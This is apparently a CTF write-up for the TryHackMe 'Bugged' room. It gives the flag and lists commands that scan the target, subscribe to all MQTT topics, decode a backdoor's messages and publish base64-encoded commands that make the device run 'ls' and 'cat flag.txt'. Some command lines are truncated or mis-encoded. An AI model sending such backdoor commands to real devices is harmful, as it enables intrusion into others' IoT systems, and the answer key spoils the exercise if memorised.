# <div align="center">[Bugged](https://tryhackme.com/r/room/bugged)</div>
<br>
<div align="center">John likes to live in a very Internet connected world. Maybe too connected...</div><br>
<div align="center">
<img src="https://github.com/user-attachments/assets/bc6de6eb-0839-405b-a33b-165c46c3393a" height="180"></img>
</div>

## Task 1. Analyze the network

John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?

### What is the flag?
```
flag{18d44fc0707ac8dc8be45bb83db54013}
```
```
sudo nmap -sV -sC <IP>
sudo apt-get install mosquitto mosquitto-clients -y
mosquitto_sub -t "#" -h <IP>
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "simple_massage" -h <IP>
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
echo "SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=" | base64 -d
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==" -h <IP>
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9" | base64 -d
echo "{"id": "cdd1b1c0–1c40–4b0f-8e22–61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}" | base64
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9" | base64 -d
```
